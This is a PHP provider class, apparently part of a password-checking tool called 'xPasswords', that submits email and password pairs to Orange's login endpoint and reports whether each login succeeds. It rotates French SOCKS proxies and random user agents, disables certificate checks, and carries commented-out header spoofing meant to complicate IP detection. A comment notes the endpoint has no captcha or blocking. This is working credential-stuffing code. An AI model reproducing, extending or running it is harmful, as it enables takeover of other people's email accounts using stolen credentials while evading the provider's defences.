<?php
namespace xPasswords\Providers;

class Orange {
    
    static public $imapAddress = 'imaps://imap.orange.fr:993';
    
    // HTTP/S: No captcha and no blocking
    static public function authenticate($email, $password) {
        
        // Shared options
        $staticOptions = [
            'CSRF' => false,
            'UserAgent' => \xPasswords\Core::getUserAgent(),
            'UserIP' => '78.212.' . rand(0, 255) . '.' . rand(0, 255),
            'SocksIP' => \xPasswords\Core::getProxy('Europe/France'),
        ];

        // STEP 1: GET SKEY AND DATE
        $request = \Requests::get('http://id.orange.fr/auth_user/bin/auth_user.cgi', [
            //'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            //'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Origin' => 'http://id.orange.fr',
        ], [
            'timeout' => 30, // Timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);
        
        switch($request->status_code) {
            
            case 302: // Parse useful stuff            
            @preg_match('/^http:\/\/id.orange.fr\/auth_user\/bin\/auth0user.cgi\?(.*?)=(.*?)&(.*?)=(.*?)$/iu', $request->headers['location'], $staticOptions['CSRF']);
            if(empty($staticOptions['CSRF']) OR
               empty($staticOptions['CSRF'][2]) OR
               empty($staticOptions['CSRF'][4])) {
                
                echo \xPasswords\Core::say('[ERROR] [PROVIDER] Unable to retrieve CSRF token @PREG_MATCH', ['color' => 'red']);
                exit(255);
            }
            
            $staticOptions['CSRF'] = [
                $staticOptions['CSRF'][1] => $staticOptions['CSRF'][2], // Date
                $staticOptions['CSRF'][3] => $staticOptions['CSRF'][4], // sKey
            ];
            break;
            
            default:
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Unable to retrieve CSRF token @STATUS_CODE', ['color' => 'red']);
            exit(255);
            break;
        }
        
        // Adding extra delay
        //\xPasswords\Core::sleep(0.5);
        if(defined('_DEBUG_MODE')) echo \xPasswords\Core::say('[INFO] [PROVIDER] Step 1 passed', ['blue']);
                
        // STEP 2: SEND CREDENTIALS TO SERVER
        $request = \Requests::post('https://id.orange.fr/auth_user/bin/auth0user.cgi?skey=' . $staticOptions['CSRF']['skey'] . '&date=' . $staticOptions['CSRF']['date'], [
            // Try to spoof and make the IP detection more complex
            //'X-FORWARDED-FOR' => $staticOptions['UserIP'],
            //'VIA' => '1.0 squid:80 (squid/2.1.STABLE3)',
            'User-Agent' => $staticOptions['UserAgent'],
            
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language' => 'Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Connection' => 'keep-alive',
            
            'Origin' => 'http://id.orange.fr',
            'Referer' => 'http://id.orange.fr/auth_user/template/auth0user/htm/vide.html',
            'Cookie' => 'ez=ok; co=42',
        ], [
            'credential' => $email,
            'pwd' => $password,
            'save_user' => 'false',
            'save_pwd' => 'false',
            'save_TC' => 'true',
            'action' => 'valider',
            'usertype' => '',
            'service' => '',
            'url' => '',
            'case' => '',
            'origin' => '',
        ], [
            'timeout' => 30, // 1 min timeout
            'proxy' => $staticOptions['SocksIP'], // SOCKS Proxy
            'useragent' => $staticOptions['UserAgent'], // Random user-agent
            'follow_redirects' => false, // Don't follow redirections
            'verifyname' => false, // Do not verify SSL certificates
            'verify' => false, // Do not verify SSL certificates
        ]);
                
        $body = trim($request->body);
        $request = NULL;
        
        if(empty($body)) {
            echo \xPasswords\Core::say('[ERROR] [PROVIDER] Unable to finish final request @ERR_EMPTY', ['color' => 'red']);
            exit(255);
        }
        
        return preg_match('/top.location.href=\'http:\/\/www.orange.fr\/portail\';/iu', $body);
    }
};